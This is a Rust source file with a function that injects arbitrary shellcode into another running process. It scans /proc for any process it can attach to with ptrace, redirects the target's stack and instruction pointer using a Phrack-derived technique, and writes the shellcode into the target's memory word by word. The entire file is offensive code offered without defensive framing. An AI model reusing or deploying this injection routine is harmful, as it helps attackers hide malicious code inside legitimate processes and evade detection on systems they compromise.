extern crate nix;
use nix::sys::ptrace::{attach, detach, getregs, setregs, write};
use nix::sys::wait::waitpid;
use nix::unistd::Pid;
use std::process::{self, Command};
use std::ffi::c_void;

pub fn inject_and_migrate(shellcode: &[u8]) {
    println!("I AM {}", process::id());
    // Find the WORD size (in bytes) for the operating system and convert it to a usize
    let word_size_in_bytes = Command::new("getconf")
                                    .arg("WORD_BIT")
                                    .output()
                                    .unwrap();
    let mut word_size_in_bytes = String::from_utf8(word_size_in_bytes.stdout)
                                    .unwrap();
    word_size_in_bytes.pop();
    let word_size_in_bytes = word_size_in_bytes.parse::<usize>().unwrap() >> 3;
    println!("WORD SIZE {}", word_size_in_bytes);

    // Mutate the shellcode to pad it with nops to a length divisible by WORD size
    let mut shellcode = shellcode.to_vec();
    let needed_size = shellcode.len() + (word_size_in_bytes - shellcode.len() % word_size_in_bytes);
    shellcode.resize(needed_size, 0x90);

    // Find a PID that ptrace can attach to
    let mut target_pid = 0;
    let list_pids = Command::new("ls")
            .arg("/proc/")
            .output()
            .unwrap();
    let mut pids: Vec<i32> = String::from_utf8(list_pids.stdout)
                                                        .unwrap()
                                                        .split('\n')
                                                        .flat_map(|s| s.parse().ok())
                                                        .collect();
    pids.retain(|i| *i > 100 && *i != process::id() as i32);
    for pid in pids.iter().rev() {
        if attach(Pid::from_raw(*pid)).is_ok() {
            target_pid = *pid;
            break;
        };
    }
    if target_pid == 0 {
        panic!("Could not find a process whose memory can be manipulated");
    }

    let debug_command = Command::new("ps")
            .arg("-p")
            .arg(target_pid.to_string())
            .arg("-o")
            .arg("command")
            .output()
            .unwrap();
    let command_output = String::from_utf8(debug_command.stdout)
                                            .unwrap();
    let command_output = command_output.trim().to_string();
    println!("TARGET PID {}", target_pid);
    println!("TARGET {}", command_output);

    // Wait for the process to be ready for manipulation, then dump registers
    let target_pid = Pid::from_raw(target_pid);
    if let Err(error) = waitpid(target_pid, None) {
        panic!("Could not wait for target process to change state: {}", error);
    }
    let mut registers = match getregs(target_pid) {
        Err(error) => panic!("Could not get registers for target process: {}", error),
        Ok(value) => value
    };

    // Modify registers similar to how http://phrack.org/issues/59/12.html did
    registers.rsp -= 4;
    if let Err(error) = unsafe { write(target_pid, registers.rsp as *mut c_void, registers.rip as *mut c_void) }{
        panic!("Unable to write RIP to RSP in target process: {}", error);
    }
    let mut point = registers.rsp - 1024;
    registers.rip = registers.rsp - 1022;
    println!("POINT {:?} RIP {:?}", point as *mut c_void, registers.rip as *mut c_void);
    if let Err(error) = setregs(target_pid, registers) {
        panic!("Unable to reset target process registers: {}", error);
    }
    println!("{:?}", registers);

    // Write shellcode to target process one WORD at a time
    let shellcode_chunks: Vec<&[u8]> = shellcode.chunks(word_size_in_bytes).collect();
    for chunk in shellcode_chunks {
        println!("WRITING VALUE {:?} FROM {:p} TO {:?}", chunk, chunk, point as *mut c_void);
        if let Err(error) = unsafe { write(target_pid, point as *mut c_void, chunk.as_ptr() as *mut c_void) } {
            panic!("Unable to portion of shellcode at {:p} to target process: {}", chunk, error);
        }
        point += word_size_in_bytes as u64;
    }

    // Detach from the process so it can resume execution
    if let Err(error) = detach(target_pid, None) {
        panic!("Unable to detach from target process: {}", error);
    }
    
    println!("DONE?");
}
